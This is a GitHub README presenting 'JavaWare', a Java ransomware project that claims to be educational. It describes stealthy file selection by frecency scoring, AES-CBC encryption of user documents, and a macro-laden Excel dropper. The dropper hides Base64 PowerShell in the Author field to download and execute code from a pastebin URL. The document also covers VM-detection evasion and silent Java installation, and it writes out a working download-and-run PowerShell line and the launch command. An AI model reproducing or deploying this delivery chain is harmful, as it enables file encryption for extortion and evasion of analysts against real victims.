# JavaWare
### A Ransomware Built in Java

#### :pushpin: Disclaimer
> I built this purely for **educational purposes**. I take no responsibility and/or liability for how you choose to use any of the code available here. If executing the ransomware, please do not do so on your own machine as it will encrypt your files. Although I did include a function to decrypt, I am in no way responsible. 

JavaWare is a ransomware which will observe your system, learn which files you use, and then encrypts your machine. Once all files have been encrypted it will launch the payload screen. 

![alt text](https://raw.githubusercontent.com/kyralmozley/JavaWare/V1.0/Screenshots/Pay%20Load.png "Launch Screen")

### :crystal_ball: How does it learn which files I use? 
Maths. 

It uses a metric called *frecency*[1] (frequency + recency) to give each file a score. Using the idea of exponential decay, it ensures that most recently used files are scored higher, and as it observes your system over the course of a week, the more a file is accessed in this time, the higher the score. It then encrypts in such a way so that files that you are not likely to be using (i.e. low scored) first, this ensures that it can go as long as possible without being noticed, allowing it to encrypt the entire filesystem. 

<p align="center">
  <img src="http://latex.codecogs.com/gif.latex?\gamma=\sum_{i=1}^n+\beta_i" border="0"/>
 </p>
 <p align="center">
  <img src="http://latex.codecogs.com/gif.latex?\beta_i=p_i\cdot {e^{-a_i\lambda}}" border="0"/>
</p>
<p align="center">
<img src="http://latex.codecogs.com/gif.latex?\lambda=\frac{\ln 2}{30}" border="0"/>
</p>

Where <img src="http://latex.codecogs.com/gif.latex?p" border="0"/> is a recency weight, <img src="http://latex.codecogs.com/gif.latex?a" border="0"/> is a frequency ranking (the time since last modification in hours), and 
<img src="http://latex.codecogs.com/gif.latex?\lambda" border="0"/> is a constant


|Recency Bucket | Score |
|---------------|-------|
| Today         | 1.0   |
| Last 5 Days   | 0.9   |
| Last 10 Days  | 0.7   |
| Last 30 Days  | 0.4   |
| Last 90 Days  | 0.1   |
| > 90 Days     | 0.0   |



### :lock: How does it encrypt? 
AES 128 bit Encryption in CBC Mode (Counter Block Mode ) PKCS5 Padding <br/>
AES is a symmetric encryption algorithm which works on blocks of a fixed size (16 bytes for AES128). *Padding* (PKCS5) is used if the block is less than 16 bytes long. We split the stream into 16 byte blocks, which is encrypted using AES and the result is XORed with the next block in the stream before it is encrypted. For the first block, it XORs it with an *initialization vector*, a random 16 byte value. 

### :page_facing_up: What does it encrypt? 
*FileTypes.java* defines what type of files to encrypt, it includes common document types and so will avoid program files to ensure your system is still functional. Similarly, *AvoidedDir.java* includes directories to avoid in traversal, such as *Windows* and *Program Files*. 

### :computer: How does it launch? 
The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field[2]. So the macro calls a function which gets the author, decodes it, and then runs the shell. The PowerShell script is: 
```powershell
Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1538VQvN).content))))
```
This piece of code downloads another Base64 encoded powershell script, that checks whether or not the system is running in a virtual machine. If it is, it stops. This is a classic trick used by sophisticated malware such that analyst cannot then observe and reverse engineer the malware. 

Once it has established it is not in a VM, it then downloads code to check whether Java is currently installed in the system, if not, it downloads the latest version silently in the background. 

Lastly, it downloads and launches the jar. 

```powershell
$JAVA_VERSION = Get-ChildItem -Path "C:\Program Files\Java" | Select-String -Pattern 'jdk-'
$java = "C:\Program Files\Java\" + $JAVA_VERSION + "\bin\java.exe"
Start-Process -FilePath $java -ArgumentList '--module-path "C:\temp\javafx-sdk-11.0.2\lib" --add-modules=javafx.controls -jar temp\JavaWare.jar' -NoNewWindow
```

### :shipit: Future Tasks 
- [ ] Add a persistence method 
- [ ] Include 'fun' features such as a backdoor, keylogger etc.






### :notebook_with_decorative_cover: References: 
[\[1\]: Frecency Algortihm](https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Frecency_algorithm) <br/>
Gave me the idea to put my powershell code in the auhtor field, and other useful powershell commands.
[\[2\]: The Increased Use of PowerShell in Attacks - Symantec](https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf) <br/>
Gave me the idea to put my powershell code in the auhtor field, and other useful powershell commands.

